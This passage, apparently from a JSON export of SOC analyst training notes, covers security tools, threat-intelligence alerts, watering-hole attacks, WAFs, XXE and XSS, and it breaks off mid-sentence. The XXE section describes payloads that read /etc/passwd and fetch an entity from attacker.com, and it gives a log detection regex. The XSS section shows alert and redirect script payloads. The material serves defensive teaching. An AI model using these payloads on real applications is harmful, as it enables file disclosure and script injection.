Solutions","links":["SOC/SOC-Analyst-Notes/Intrusion-Detection-System-(IDS)","SOC/SOC-Analyst-Notes/Intrusion-Prevention-System-(IPS)","SOC/SOC-Analyst-Notes/Firewall","SOC/SOC-Analyst-Notes/Endpoint-Detection--and--Response-(EDR)","SOC/SOC-Analyst-Notes/Antivirus-Software","SOC/SOC-Analyst-Notes/Sandbox-Solutions","SOC/SOC-Analyst-Notes/Data-Loss-Prevention","SOC/SOC-Analyst-Notes/Asset-Management-Solutions","SOC/SOC-Analyst-Notes/Web-Application-Firewall","SOC/SOC-Analyst-Notes/Load-Balancer","SOC/SOC-Analyst-Notes/Proxy-Server","SOC/SOC-Analyst-Notes/Email-Security-Solutions","SOC/SOC-Analyst-Notes/Splunk"],"tags":[],"content":"Index\n1. Intrusion Detection System (IDS)\n2. Intrusion Prevention System (IPS)\n3. Firewall\n4. Endpoint Detection &amp; Response (EDR)\n5. Antivirus Software\n6. Sandbox Solutions\n7. Data Loss Prevention\n8. Asset Management Solutions\n9. Web Application Firewall\n10. Load Balancer\n11. Proxy Server\n12. Email Security Solutions\nNext: Splunk"},"SOC/SOC-Analyst-Notes/Splunk":{"slug":"SOC/SOC-Analyst-Notes/Splunk","filePath":"SOC/SOC Analyst Notes/Splunk.md","title":"Splunk","links":["SOC/SOC-Analyst-Notes/Adding-Data-to-Splunk","SOC/SOC-Analyst-Notes/Searching-Data-in-Splunk","SOC/SOC-Analyst-Notes/Cyber-Threat-Intelligence"],"tags":[],"content":"Index\n1. Adding Data to Splunk\n2. Searching Data in Splunk\nNext: Cyber Threat Intelligence"},"SOC/SOC-Analyst-Notes/Static-Email-Analysis":{"slug":"SOC/SOC-Analyst-Notes/Static-Email-Analysis","filePath":"SOC/SOC Analyst Notes/Static Email Analysis.md","title":"Static Email Analysis","links":["SOC/SOC-Analyst-Notes/Phishing","IP-address"],"tags":[],"content":"Many people find plain text boring, which is why email programs offer HTML support, allowing us to create emails that are more likely to grab the user’s attention. Of course, there is a downside to this feature. Attackers can use HTML to create emails that hide malicious URLs behind buttons or text that appear to be harmless.\n\nAs seen in the image above, the address the user sees when clicking on a link can be different (the real address is seen when the user hovers over the link).\nIn most Phishing attacks, the attackers take a new domain address and complete a Phishing attack within a few days. Therefore, if the domain name in the email is new, it is more likely to be a Phishing attack.\nBy querying VirusTotal for web addresses in emails, we can find out if the antivirus engines detect the web address as harmful.\nPerforming a static analysis of the files in the email can provide insight into the capacity/capability of the file. However, since static analysis takes a long time, dynamic analysis can provide the information you need more quickly.\nCisco Talos Intelligence has search sections where we can learn the reputation of IP addresses. By looking up the SMTP address of the email we detected in Talos, we can see the reputation of the IP address and find out if it is on the blacklist. If the SMTP address is blacklisted, it can be assumed that the attack was carried out on a compromised server.\n\nSimilarly, the SMTP address can be searched on VirusTotal and AbuseIPDB to find out if the IP address has been involved in malicious activity in the past."},"SOC/SOC-Analyst-Notes/Timestomping":{"slug":"SOC/SOC-Analyst-Notes/Timestomping","filePath":"SOC/SOC Analyst Notes/Timestomping.md","title":"Timestomping","links":["SOC/SOC-Analyst-Notes/Masquerading"],"tags":[],"content":"Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files and to revert modification date of file.\nTimestomping may be used along with file name Masquerading to hide malware and tools."},"SOC/SOC-Analyst-Notes/Unified-Kill-Chain":{"slug":"SOC/SOC-Analyst-Notes/Unified-Kill-Chain","filePath":"SOC/SOC Analyst Notes/Unified Kill Chain.md","title":"Unified Kill Chain","links":["SOC/SOC-Analyst-Notes/Cyber-Kill-Chain","SOC/SOC-Analyst-Notes/Reconnaissance","SOC/SOC-Analyst-Notes/Gaining-Initial-Foothold","SOC/SOC-Analyst-Notes/Network-Propagation","SOC/SOC-Analyst-Notes/Adversary's-Objectives","SOC/SOC-Analyst-Notes/MITRE-ATT-and-CK-Framework"],"tags":[],"content":"The unified kill chain aims to complement (not compete with) other cybersecurity kill chain frameworks, such as The Cyber Kill Chain. It states that there are 18 phases to an attack: Everything from Reconnaissance to data exfiltration and understanding an attacker’s motive.\n\nThe unified kill chain can be divided into 3 categories:\nPhase: IN\nThis is the phase where adversary gains initial foothold in the system. It is described in detail in Gaining Initial Foothold page.\nPhase: THROUGH\nThis is the phase where the adversary moves through the network and gains access to the whole network. It is explained in detail in Network Propagation page.\nPhase: OUT\nThis is the stage where the adversary will execute their objective and end the process. This phase is explained in detail in Adversary’s Objectives page.\nNext: MITRE ATT&amp;CK Framework"},"SOC/SOC-Analyst-Notes/Using-Threat-Intelligence":{"slug":"SOC/SOC-Analyst-Notes/Using-Threat-Intelligence","filePath":"SOC/SOC Analyst Notes/Using Threat Intelligence.md","title":"Using Threat Intelligence","links":[],"tags":[],"content":"After the data is interpreted in relation to the attack surface, it will become consumable threat intelligence. The intelligence obtained can be used in the following 3 different areas.\n\n\nExternal Attack Surface Management (EASM)\n\n\nDigital Risk Protection (DRP)\n\n\nCyber ​​Threat Intelligence (CTI)\n\n\nWhen these 3 areas are combined, they form the XTI structure we mentioned at the beginning of our training. Each structure consumes intelligence by using it on different topics.\nExternal Attack Surface Management (EASM)\nEASM is part of XTI, which manages organizations’ outward assets. We explained how to create the attack surface, which is the basis of External Attack Surface Management, in the previous sections. In this section, we will cover how we manage the attack surface we have created and how it is fed from the collected intelligence.\nAttack surface is essential for organizations to detect their unknown or forgotten assets and provide visibility and the EASM will come into play right at this point since any security vulnerability on these assets will pose a risk for the organization. Detected assets must be monitored constantly. For example, adding a newly purchased domain to the asset list immediately or deleting a discontinued domain from the asset list is a part of this monitoring effort. We can keep track of these assets through External Attack Surface Management. EASM will notify the user if a domain expires, the title of the website changes or a subdomain is created. One of the main factors that will provide intelligence in this section is the use of information obtained from the assets themselves. A second factor is using the intelligence produced as a result of the vulnerability data obtained from outside sources like Shodan, etc. In this part, we receive notifications about security vulnerabilities on our assets as a result of the intelligence we used.\nIn the section below, the alarms that may occur as a result of the active use of threat intelligence by EASM and the actions we can take are mentioned:\nNew Digital Asset(s) Detected\nThis is the warning we will encounter when a new asset is detected and added to our continuously monitored asset list. We need to check whether the asset really belongs to our organization and was created by the authorized users of our organization.\nDomain Information Change Detected\nIt is the warning that alerts us when there is any change in the whois information of the domain in our asset list. We should check this activity to see if it is a harmful activity or not by comparing the old and the new data, and verifying if the change is made by the authorized users of our organization.\nDNS Information Change Detected\nThis is the warning that alerts us when there is any change in the DNS records of the domain in our asset list. We should check this activity to see if it is a harmful activity or not by comparing the old and the new data, and verifying if the change is made by the authorized users of our organization.\nDNS Zone Transfer Detected\nThis is the warning that alerts us when there is a change DNS Zone Transfer status of the domain in our asset list. We should check the DNS records for the relevant assets and verify if there is a zone transfer.\nInternal IP Adress Detected\nSince the IP addresses we specify in the A records of our domains are open to the public and can be seen outside of our network, they must not be internal IP addresses. If an internal IP is disclosed in the A record of a domain or subdomain, we will receive an alert that warns us of the “Internal IP Address Detected” on our EASM side. This may happen due to the lack of communication between different teams in our organization. In such cases, the process should be verified by contacting the POC of the DNS record maintenance and the root cause should be investigated. The IP should be changed if its use is not necessary.\nCritical Open Port Detected\nThis is the warning that alerts us when there is an indication for open critical ports on the IPs that we are monitoring within the intelligence we received from sources such as “Shodan”. We should check the ports claimed to be open on the relevant IP addresses that we receive the alert, and we should close or filter them if they are not the ports used by our network actively. If the open ports are used actively, then we should update the services running on them and keep them up to date, and make sure that necessary configurations are complete.\nSMTP Open Relay Detected\nThis is the warning that alerts us when there is an open relay status for our mail server which we monitor within our asset list. We should investigate the mail server in question and verify the status of the mail server by contacting the POC of the server.\nSPF/DMARC Record Not Found\nSPF and DMARC records are constantly checked for domains that we track in our asset list, and we receive this alert when these records are not found. These records must be configured correctly for the security of our mail servers. We need to contact the POC of our mail server and verify its status.\nSSL Certificate Revoked/Expired\nSSL certificates are one of the most important elements for secure communication. Our SSL certificates hosted on our domains should be monitored regularly within our asset list. We will receive this alert if one of our SSL certificates is expired or revoked. Any communication carried out without SSL poses high risks as the data is transmitted in clear text and can be seen by third parties. Therefore, we need to renew our SSL certificate as soon as possible when we receive this alert.\nSuspicious Website Redirection\nSometimes we redirect some of our domains to some of our websites. If we do this frequently, we are likely to miss suspicious redirects. Therefore, we need to receive feeds that provide us with the status codes of our websites and where they are directed. If we receive this alert, it means that one of our domains in our asset list is redirecting to a website that is not in our asset list. This indicates a potential breach. We must urgently check the redirection and report the case to the relevant team that manages these issues.\nSubdomain Takeover Detected\nWe receive this alert if a takeover is detected on a subdomain. This case should be investigated to find the DNS record that this takeover took place and the details should be shared with the team that will handle the case.\nWebsite Status Code Changed\nWe receive this alert when the status code that our website returns back to us is changed. This warning comes to us from the data containing the status codes of the websites. In order to prevent service interruptions, the status code and the problem should be determined with its root cause, and the solutions to remediate the issue should be applied immediately.\nVulnerability Detected\nThis alert comes to us as a result of intelligence obtained from vulnerability data. If we encounter this warning, it means that there is a match between the vulnerabilities in the data and our network applications, SSL certificates, domains, websites, IPs, or 3rd party technologies. If the warning is generated from the CVE data and there is product and version information in which the vulnerability is triggered in the details of the CVE, the accuracy of the alert is very high, immediate action must be taken and the suggested fixes should be applied immediately. The accuracy rate may be slightly lower if the warning is coming from other sources like shodan, etc.\nDigital Risk Protection\nDRP is the part of XTI that constitutes most of the intelligence for the organization after all the data collected from all the sources are mapped with the attack surface following the interpretation of the data. In this section, we will cover topics such as the protection of brand reputation, threats on the Deep&amp;Dark Web, fraud protection specific to banks, the impact of risks that may occur in any organization in the supply chain, threats to the organization on the web surface and protection for senior executives, and the threats and risks we may face related to these as well as how we should take action against them will be detailed. Below are the alarms that we may encounter within the scope of DRP and the actions we can take:\nPotential Phishing Domain Detected\nNewly registered domains or previously registered domains with newly created SSL certificates are an intelligence source for us. After interpreting the data obtained from these sources, we encounter this warning for domains with a structure similar to our domains in the intelligence obtained. When we receive this alert, we should investigate the relevant domain in safe environments and determine whether they are mimicking our original content. If these domains mimic our brand and/or content, we should contact the domain registrar and the ISP that hosts the content of the fraudulent site to take it down immediately. If there is nothing suspicious in the content, the domain should still be monitored there is a high potential for that domain to turn into a phishing site.\nRogue Mobile Application Detected\nIf our organization has mobile applications, we will receive this alert if there is a match with our official mobile application and the data that contains the pirated APK files found on pirated APK sites with similar names and similar content. The APK files transmitted in this alert should be analyzed in a safe environment, and quick remediation action should be taken if they are found malicious. These copycat mobile applications should be taken down immediately to avoid any malicious activities and to protect our brand reputation.\nIP Address Reputation\nThere are multiple reasons that cause the loss of reputation of IP addresses. If we receive this alert it means that there is an incident that occurred affecting our IP reputation. Possible reasons for the loss of the IP reputation are as follows:\n\n\nIf the IP address is blacklisted on any source for any reason,\n\n\nIf the IP address is found in a feed containing harmful IOCs,\n\n\nIf the IP address has been involved in an activity in the torrent network,\n\n\nthen the reputation of the IP address will be lost.\nWe will receive this alert if any of our IP addresses are among the resources that will cause this reputation loss. If it is a blacklist case, we should investigate the root cause and determine on what sources it has been blacklisted. The root cause of the blacklist should be investigated and eliminated. It will be more risky and harmful if our IP addresses have been found in a feed containing harmful IOCs or involved in the torrent network because our IP addresses could potentially be used in a malicious campaign. This raises the possibility that the organization has been breached. In this case, we must quickly investigate the relevant systems retrospectively and identify the root cause. If the breach has happened, we need to enforce the internal policies.\nImpersonating Social Media Account Detected\nSocial media is a platform that many organizations use to represent themselves. Thousands of new accounts are created every day on these platforms. Not all accounts are created with good intentions. Many accounts may be created with user names that can imitate the original accounts of the organization or with the intention to conduct smear campaigns against the organization. We will receive this alert if we encounter such a situation. In this case, the relevant account should be reviewed and determined whether it is just a name similarity or an attempt to mimic. If the account is being used for fraud or a smear campaign against our organization, we should contact the support team of the relevant social media application and request that this account be closed.\nBotnet Detected at Black Market\nWe receive this alert if any of our organization’s domain or IP addresses is included in the botnet data in the black markets. The user system that became a bot reported in the alert may belong to one of our employees or customers. If the system belongs to a customer, the user’s password should be reset to remediate the incident. If the system belongs to one of our employees forensics investigation should be conducted, the system should be isolated from the network immediately, employee’s network credentials must be reset. Further investigations must be conducted on the system to determine if the system is infected or not.\nSuspicious Content Detected at Deep&amp;Dark Web\nDeep&amp;Dark web environments are monitored and all data is collected regularly. We receive this alert if there is anything that mentions our organization in the data after the collected data is interpreted. For example, if there is a post on a hacker forum mentioning an attack against our organization, then we can implement security tightening even before the attack occurs. We can avoid the attack totally or get it over with the least damage thanks to these posts. When we encounter this alert, the post that threatens our organization and its content should be analyzed thoroughly, and necessary actions should be taken accordingly.\nSuspicious Content Detected at IM Platforms\nInstant messaging platforms such as Telegram, ICQ, and IRC are the environments that threat actors use for communication. We receive this alert if there is anything that mentions our organization in the data after the conversations of the threat actors in the public or private groups of these platforms are monitored and the collected data is interpreted. In this case, the conversation or the statement about our organization should be analyzed thoroughly and the context of the mention regarding our organization should be determined. If there is a threat to the organization, necessary actions should be taken quickly.\nStolen Credit Card Detected\nIt is a common situation for fraud teams of banks. Threat actors steal credit card information by phishing or other ways and share or sell them in the dark web environment. In these types of cases, banks should follow these stolen credit cards well in order to protect their customers. We receive this alert if a stolen credit card number matches with one of the bank’s with the help of the intelligence gathered. In this case, we must inform the fraud teams immediately and take action to cancel the card.\nData Leak Detected on Code Repository\nWe mentioned that code repositories such as Github, Bitbucket, Azure Blob, and Amazon S3 where we can store data or store codes are one of the sources of intelligence. Sometimes sensitive data for the organization may be forgotten in such environments. We will receive this alert if sensitive and critical data such as an IP address of the organization, domain, database access information, login information that belongs to employees, or if a sensitive report related to the organization is detected in a bucket through the intelligence gathered. In this case, we must take quick action to delete the sensitive data if we manage the relevant repository or bucket. If someone outside of our organization manages it, then, we should go after the takedown option.\nCompany Related Information Detected on Malware Analysis Services\nPublic sandboxes are one of the important intelligence sources for the organization to detect malicious files against our organization. Thousands of samples are uploaded and analyzed in these sandboxes every day. A malicious file referring to our organization is crucial for our organization. It may target our organization directly or may have been uploaded by an attacker with the intention of smearing our organization. In these cases, we receive these alerts as a warning for these malicious files that refer to our organization within the collected data and we should investigate and analyze the malicious file and take the necessary actions.\nEmployee and VIP Credential Detected\nThese are the warnings that will occur if there is a data leak related to our employees, especially the VIPs that we keep monitoring actively. When we see these alerts we need to apply the password reset process for the relevant users quickly.\nCyber Threat Intelligence\nCTI is considered a part of XTI, which is the next-generation threat intelligence. It is a sub-branch of XTI and it is where we can be aware of what is happening in the cyber world in general, where we can learn about current malicious campaigns, the orientation of ransomware groups, or offensive IP addresses around the world. Since it may be difficult to protect our organization with CTI alone, we should support the CTI with our corporate feeds to obtain the most efficient intelligence. We are able to use our SIEM, SOAR, and EDR tools more effectively by integrating them into the CTI feeds and protect our organization better."},"SOC/SOC-Analyst-Notes/Watering-Hole":{"slug":"SOC/SOC-Analyst-Notes/Watering-Hole","filePath":"SOC/SOC Analyst Notes/Watering Hole.md","title":"Watering Hole","links":[],"tags":[],"content":"A watering hole attack is a targeted attack designed to aim at a specific group of people by compromising the website they are usually visiting and then redirecting them to the malicious website of an attacker’s choice.\nThe attacker would look for a known vulnerability for the website and try to exploit it. The attacker would encourage the victims to visit the website by sending “harmless” emails pointing out the malicious URL to make the attack work more efficiently. After visiting the website, the victim would unintentionally download malware or a malicious application to their computer. This type of attack is called a drive-by download. An example can be a malicious pop-up asking to download a fake Browser extension."},"SOC/SOC-Analyst-Notes/Web-Application-Firewall":{"slug":"SOC/SOC-Analyst-Notes/Web-Application-Firewall","filePath":"SOC/SOC Analyst Notes/Web Application Firewall.md","title":"Web Application Firewall","links":[],"tags":[],"content":"What is a Web Application Firewall (WAF)?\nWeb Application Firewall (WAF) is security software or hardware that monitors, filters, and blocks incoming packets to a web application and outgoing packets from a web application.\nTypes of WAF\nThere are several types of WAF products:\n\nNetwork-based WAF\nNetwork-based WAF is a security product that is hardware-based on the relevant network. It needs staff to write rules on it and to maintain it. Although it is an effective WAF product, it is more expensive than other WAF products.\nHost-based WAF\nHost-based WAF is a cheaper product than network-based WAF. It is a WAF with more customization possibilities. Considering that it is a software product, it consumes the resources of the server it is on. It may be more difficult to maintain and the systems on it must be securely hardened.\nCloud-based WAF\nCloud-based WAF is a much more convenient and easy-to-apply security solution than other WAF products purchased as an external service. Since the maintenance and updates of the WAF product belong to the service area, there are no additional costs such as cost and maintenance. However, it is a matter to be considered that the cloud-based WAF product that is serviced has sufficient customizations suitable for you.\nHow does a web application firewall (WAF) work?\nA WAF manages inbound application traffic according to existing rules on it. These requests, which belong to the HTTP protocol, are either allowed or blocked per the rules. Since it works at the application layer level, it can prevent web-based attacks. In the image below, the working logic of the WAF product is shown in a basic sense:\n\nBefore going to the web application, HTTP requests from users are met in the WAF product. According to the rule set on the WAF product, as shown in the image below, some requests are not allowed to pass, and thus requests that create malicious traffic are blocked. Here, it is very important how the rules on the WAF define the attack, otherwise, it is possible to block incoming normal requests even though they do not show malicious behavior. This shows that the WAF product is not used efficiently and correctly, so it may result in not being able to prevent the attack at some points.\n\nThe image above, it is shown how an action is taken on the WAF product against normal and malicious requests.\nThe Importance of WAF for Security\nToday, applications in almost every sector are available in local networks or open to the Internet. Ensuring the security of web applications, which are widely used in the IT world, is of critical matter. Serious data leaks or security breaches can occur on unsecured web applications. To prevent all these security breaches, WAF products are placed in front of web applications. Even the presence of the WAF product in front of the web applications is not sufficient to ensure application security, while the absence of the WAF product is not recommended at all.\nSome popular WAF products used in the cybersecurity industry are as follows:\n\nAWS\nCloudflare\nF5\nCitrix\nFortiweb\n"},"SOC/SOC-Analyst-Notes/Web-Attacks":{"slug":"SOC/SOC-Analyst-Notes/Web-Attacks","filePath":"SOC/SOC Analyst Notes/Web Attacks.md","title":"Web Attacks","links":["SOC/SOC-Analyst-Notes/OWASP","SOC/SOC-Analyst-Notes/How-Web-Applications-Work","SOC/SOC-Analyst-Notes/SQL-Injection","SOC/SOC-Analyst-Notes/XSS-Attack","SOC/SOC-Analyst-Notes/Command-Injection","SOC/SOC-Analyst-Notes/IDOR-Attack","SOC/SOC-Analyst-Notes/Open-Redirection-Attack","SOC/SOC-Analyst-Notes/Directory-Traversal-Attack","SOC/SOC-Analyst-Notes/Brute-Force-Attack","SOC/SOC-Analyst-Notes/XEE-Attack","Malware-Analysis/Malware-Analysis"],"tags":[],"content":"What are Web attacks?\nBecause web applications serve as the interface to the internet for many organizations, they can be exploited by attackers to gain access to devices, steal personal data, or cause service disruptions, resulting in significant financial damage.\nA study found that 75% of all cyber-attacks are targeted at the web application level.\nIntroduction\n1. OWASP\n2. How Web Applications Work\nAttack Vectors\n1. SQL Injection\n2. XSS Attack\n3. Command Injection\n4. IDOR Attack\n5. Open Redirection Attack\n6. Directory Traversal Attack\n7. Brute Force Attack\n8. XEE Attack\nNext: Malware Analysis"},"SOC/SOC-Analyst-Notes/What-is-SOC":{"slug":"SOC/SOC-Analyst-Notes/What-is-SOC","filePath":"SOC/SOC Analyst Notes/What is SOC.md","title":"What is SOC","links":["SOC/SOC-Analyst-Notes/Pyramid-of-Pain"],"tags":[],"content":"What is SOC?\nSecurity Operations Center (SOC) is a team of IT security professionals tasked with monitoring, preventing , detecting , investigating, and responding to threats within a company’s network and systems.\nResponsibilities of SOC\n\nNext: Pyramid of Pain"},"SOC/SOC-Analyst-Notes/Wireshark":{"slug":"SOC/SOC-Analyst-Notes/Wireshark","filePath":"SOC/SOC Analyst Notes/Wireshark.md","title":"Wireshark","links":[],"tags":[],"content":"Tool used to analyze network traffic. The GOAT"},"SOC/SOC-Analyst-Notes/XEE-Attack":{"slug":"SOC/SOC-Analyst-Notes/XEE-Attack","filePath":"SOC/SOC Analyst Notes/XEE Attack.md","title":"XEE Attack","links":[],"tags":[],"content":"What is XML External Entity?\nFor a better understanding let’s quickly look at what XML is.\nXML (Extensible Markup Language) is a markup language that is used for structuring and storing data in a structured format that is both human-readable and machine-readable. XML was developed as a successor to HTML (Hypertext Markup Language) and is widely used for data exchange between different systems and platforms, particularly on the web.\nXML uses a set of tags to define the structure and content of the data being represented. These tags are used to identify and describe various elements and attributes of the data, such as tags for opening and closing elements, attributes for specifying additional information about the element, and entities for representing special characters and symbols.\nOne of the key advantages of XML is its flexibility and extensibility. It is possible to define custom tags and schemas for representing data, making it a powerful tool for representing complex data structures and exchanging data between different systems.\nWhile XML was once widely used for a variety of purposes, its usage has declined in recent years as newer data formats like JSON have gained popularity with its simplicity, ease of use, and better support for modern web technologies.\nXXE (XML External Entity) vulnerability is a type of security vulnerability that affects applications that parse XML input. In an XXE attack, an attacker injects malicious XML data into an application that uses an XML parser without proper validation, which can result in the application processing external entities that can be controlled by the attacker.\nAn external entity is a piece of XML that is defined outside of the XML document, but can be referenced and included within the document. An attacker can exploit an XXE vulnerability to include malicious external entities that can read local files, access internal systems, or perform other malicious actions on the server.\nXXE vulnerabilities can be exploited in various ways, such as through web forms that accept XML input, SOAP and REST APIs that use XML-based payloads, or other applications that accept and process XML input. These attacks can lead to sensitive data leaks, server-side request forgery (SSRF), denial of service (DoS) attacks, and other serious security issues.\nIt is important for developers to be aware of XXE vulnerabilities and take steps to prevent them, such as disabling external entities, validating and sanitizing XML input, and using secure XML parsers that are specifically designed to prevent XXE attacks.\nXML External Entity Possible Vectors\nTo find XML External Entity (XXE) vulnerabilities in a web application, you can start by examining the application’s XML processing code to identify any input points that accept XML input. These input points could include:\n\nForm fields that accept XML input\nXML files uploaded by users\nAPIs that accept XML requests\nXML files used for configuration or other purposes\n\nOnce you have identified the input points that accept XML input, you can test them for XXE vulnerabilities by providing input that includes external entity references and observing the application’s response.\nYou can also use automated vulnerability scanners and penetration testing tools that can detect and exploit XXE vulnerabilities. These tools can send various payloads that include external entity references and observe the response to determine if the application is vulnerable.\nHow XML External Entity Works?\nXXE attacks can depend on the programming language used by the server-side application. The XXE attack vector exploits a vulnerability in the XML parser of the server-side application, and the specific vulnerabilities and defenses can vary depending on the programming language used.\nFor example, PHP has a built-in XML parser called DOMDocument that is often used in web applications. The parser can be vulnerable to XXE attacks if the XML input is not properly validated and sanitized, and external entities are not disabled. As a defense, developers can use the libxml_disable_entity_loader() function to disable the loading of external entities in PHP.\nHere’s an example of vulnerable PHP code that demonstrates an XXE vulnerability:\n\nIn this example, the PHP script accepts an XML input parameter named “xml” and uses the loadXML() method of the DOMDocument class to parse it into a DOMDocument object. However, the code does not properly validate or sanitize the XML input, which can allow an attacker to inject an external entity and perform a variety of malicious actions.\nAn attacker could send the following XML input to exploit the XXE vulnerability:\n\nIn this XML input, the attacker defines a new external entity called “xxe” that references the “/etc/passwd” file on the server. When the PHP script processes this input, it will load the “/etc/passwd” file and include its contents in the output, which can allow the attacker to read sensitive information from the server.\nTo prevent XXE attacks in PHP, it is important to validate and sanitize any XML input properly and disable the processing of external entities whenever possible. You can use the libxml_disable_entity_loader() function to disable the loading of external entities in PHP. Additionally, you can use input validation and sanitization functions such as filter_var() to ensure that the XML input is properly formatted and does not contain any malicious payloads.\nLet’s take a look at how XXE vulnerability appears in Java servlet applications;\n\nIn this example, the servlet accepts an XML input parameter named “xml” and uses a DocumentBuilder object to parse it into a Document object. However, the code does not properly validate or sanitize the XML input, which can allow an attacker to inject an external entity and perform a variety of malicious actions.\nAn attacker could send the following XML input to exploit the XXE vulnerability:\n\nIn this payload, we define an external entity xxe that points to a remote XML file attacker.com/xxe.xml. Then, we include the entity within the  element using the &amp;xxe; syntax.\nWhen the XML parser processes this payload, it will attempt to fetch the remote xxe.xml file specified in the xxe entity. If the server hosting the vulnerable application is vulnerable to SSRF, this can result in the attacker being able to access internal systems or perform other malicious actions on the server.\nImpact of XML External Entity\nThe impact of an XXE vulnerability can vary depending on the specific vulnerability and the context of the application. In general, however, an XXE vulnerability can be quite serious and can result in a range of harmful outcomes, including:\n\nInformation disclosure: An attacker can use an XXE vulnerability to access sensitive data from the server with read/write capability that will allow the attacker to modify/transfer the data, such as configuration files, user credentials, and other sensitive information.\nServer-side request forgery (SSRF): An attacker can use an XXE vulnerability to make requests on behalf of the server, allowing them to scan internal networks, exploit other vulnerabilities, and carry out further attacks.\nDenial of service (DoS): An attacker can use an XXE vulnerability to launch a DoS attack by sending an XML input that causes the server to consume excessive resources, such as memory or CPU time.\nRemote code execution (RCE): In some cases, an attacker can use an XXE vulnerability to execute arbitrary code on the server, allowing them to take full control of the server and carry out further attacks.\n\nTherefore, it is important to identify and remediate XXE vulnerabilities in web applications to prevent these and other harmful outcomes. Best practices for preventing XXE attacks include properly validating and sanitizing all XML input, disabling the processing of external entities, and using the latest secure versions of XML parsers and frameworks.\nPrevention Methods for XML External Entity\nThere are several best practices that can help prevent XXE attacks:\nDisable external entities: One of the most effective ways to prevent XXE attacks is to disable the processing of external entities in the XML parser configuration. This can be done by setting the appropriate parser configuration or using a secure XML parser that has external entity processing disabled by default.\nInput validation and sanitization: Always validate and sanitize all XML input before parsing it. This includes checking for malicious input such as nested XML entities, XML injections, and other forms of malicious input.\nUse secure parsers: Use the latest version of a secure XML parser that has been specifically designed to prevent XXE attacks. These parsers have features that can help detect and prevent XXE attacks.\nUse whitelist filtering: Implementing a whitelist of allowed entities and DTDs can help reduce the risk of XXE attacks by blocking any input that is not on the whitelist.\nImplement access controls: Implement proper access controls to restrict access to sensitive data and resources. This can help limit the damage in case an XXE vulnerability is exploited.\nUse secure coding practices: Use secure coding practices, such as input validation, data sanitization, and error handling, to minimize the risk of XXE attacks.\nBy implementing these best practices, you can significantly reduce the risk of XXE attacks in your web application. It is important to keep up-to-date with the latest security best practices and patches for your web application, and to periodically perform security assessments to identify and remediate any vulnerabilities.\nHere’s an example of vulnerable PHP code that is susceptible to XML External Entity attacks:\n\nThe code above loads an XML input from the php://input stream and passes it directly to the loadXML() method of the DOMDocument class without any validation or sanitization. This makes it vulnerable to XXE attacks.\nTo fix this vulnerability, we need to validate and sanitize the XML input and disable external entities. Here is an example of a fixed version of the code:\n\nIn the code above, we have disabled external entities using the function libxml_disable_entity_loader(), which prevents XXE attacks. We have then validated and sanitized the XML input using a regular expression that only allows alphanumeric and underscore characters. If the input passes validation, we load it into the DOMDocument object and output the sanitized XML. If the input fails validation, we output an error message.\nThis fixed code ensures that the XML input is properly validated, sanitized, and processed securely, and is much less vulnerable to XXE attacks.\nDetecting XML External Entity Attacks\nIn Part 1, we have overviewed what the XML External Entity is and how to prevent this vulnerability. In this part, we’ll have a look at the detection techniques and some tips to make it easier. Before moving on let’s take a quick look for example payloads for the XML External Entity vulnerability;\nBasic XXE Payload\n\nBlind XXE Payload\n\nXXE Payload with PHP Filter\n\nHere’s an example of what an Nginx log might look like when an XXE attack occurs via a vulnerable parameter on a GET request (This methodology is the same as analyzing POST requests):\n\nIn this log, the IP address of the client making the request is 123.45.67.89. The request was a GET request to the processXML endpoint, with an xml parameter that contains an XXE payload. The XXE payload attempts to read the contents of the /etc/passwd file. The response code is 200, indicating that the request was successful, and the response size is 143 bytes. The user agent string indicates that the request was made from a Chrome browser on a Windows 10 machine.\n\nThe most important things to detect XXE attacks on the logs, you should check specific keyword like;\n\nDOCTYPE\nELEMENT\nENTITY\n\nSo for the detecting !DOCTYPE keyword in nginx logs, we can use regex like;\n^(\\S+) - (\\S+) [(.?)] ”(\\S+) (.?)?(?=.?\\b21DOCTYPE\\b).? HTTP/\\d.\\d” (\\d+) (\\d+) ”(.?)” ”(.?)”\n\n21 is for the encoded version of the ! character. Because !DOCTYPE is equal to %21DOCTYPE. This regex will match the following line on the example that we have shared above;\n\nAnd decoded versions are;\n\nSo, it can be clearly seen that the user sends to XXE payload from source IP 123.45.67.89 on dates 30/Apr/2023:12:34:57 and 30/Apr/2023:12:34:59."},"SOC/SOC-Analyst-Notes/XSS-Attack":{"slug":"SOC/SOC-Analyst-Notes/XSS-Attack","filePath":"SOC/SOC Analyst Notes/XSS Attack.md","title":"XSS Attack","links":["SOC/SOC-Analyst-Notes/OWASP"],"tags":[],"content":"What is Cross-Site Scripting (XSS)?\nCross-site scripting (XSS) is a type of injection-based web security vulnerability that can be incorporated into legitimate web applications, allowing malicious code to be executed.\n\nToday, most frameworks used to develop web applications have taken preventative measures against cross-site scripting attacks. However, we still see XSS vulnerabilities today because frameworks are sometimes not used, or the framework itself has an XSS vulnerability and the data coming from the user is not sanitized.\nTypes of XSS\nThere are 3 types of XSS. These are:\n\n\nReflected XSS (Non-Persistent): This is a non-persistent type of XSS where the XSS payload must be present in the request. It is the most common type of XSS.\n\n\nStored XSS (Persistent): This type of XSS is where the attacker can permanently upload the XSS payload to the web application. Compared to other types, Stored XSS is the most dangerous type of XSS.\n\n\nDOM Based XSS: DOM Based XSS is an XSS attack where the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client-side script so that the client-side code runs in an “unexpected” manner. (OWASP)\n\n\nHow does XSS work?\nLike other web attack methods, XSS is a vulnerability that is caused by a lack of data sanitization. It occurs when the data received from the user is sent in the response without being sanitized.\nLet’s look at an example to understand XSS attacks better.\n\nFirst, we’ll examine the piece of code above. What it does is actually quite simple. It simply displays whatever is entered in the ‘user’ parameter. If we enter “LetsDefend” as the ‘user’ parameter, we will see the words “Hello LetsDefend”.\n\nSo far there is no problem. If we enter the appropriate data in the user parameter, we are greeted with a warm welcome. But, as we have already seen, there is no control mechanism for the user parameter. This means that whatever we put in the “user” parameter will be included in the HTTP response we receive back.\nSo what would happen if we didn’t enter a normal value, but instead a payload that would trigger a popup?\nPayload: alert(1)\n\nBecause whatever is put in the ‘user’ parameter is included directly in the HTTP response, the javascript code we wrote worked and a pop-up window appeared on the screen.\nThis is exactly how XSS works. Because the value entered by the user is not validated, the attacker can enter any javascript code and get the result they want. Another question is, what if the attacker wants to redirect the user to a malicious site?\nPayload: window.location=’google.com’\nletsdefend.io/xss_example.php%3Cscript%3Ewindow.location=%27google.com%27%3C/script%3E\n\nOf course we are not going to direct you to a web application. Directing you to Google will be sufficient as an example. When the user 